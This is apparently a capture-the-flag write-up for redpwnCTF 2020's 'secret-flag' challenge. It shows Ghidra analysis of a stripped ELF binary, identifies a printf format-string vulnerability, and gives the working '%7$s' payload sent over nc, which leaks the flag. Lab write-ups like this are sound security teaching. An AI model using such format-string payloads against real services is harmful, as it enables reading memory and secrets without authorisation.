# secret-flag

>There's a super secret flag in printf that allows you to LEAK the data at an address??

> nc 2020.redpwnc.tf 31826

Files provided:
* the-secret:   ELF64 file

This file is stripped:
```sh
$ file ./the-secret
secret-flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03c6845dc54ee5f3cef2d41be905ca0a7065ebef, stripped
```

So, let's analyze it with `Ghidra`:

![alt text](img/the-secret-chl-1.png?raw=true "Ghidra")

`FUN_0010091a` seems to be the `main`.

As we can see, the content of `flag.txt` is put into `__buf`

Take a look to these lines:
```c
20  fgets(local_28,0x14,stdin);
21  printf("Hello there: ");
22  printf(local_28);
```

Clearly, there is a `format-string` vulnerability, so we can use it to read the string `__buf`.

Exactly we have to read the 7th parameter as a string to leak the `flag`.

```sh
$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%7$s
Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w}
```

So, here's the flag: `flag{n0t_s0_s3cr3t_f1ag_n0w}`.
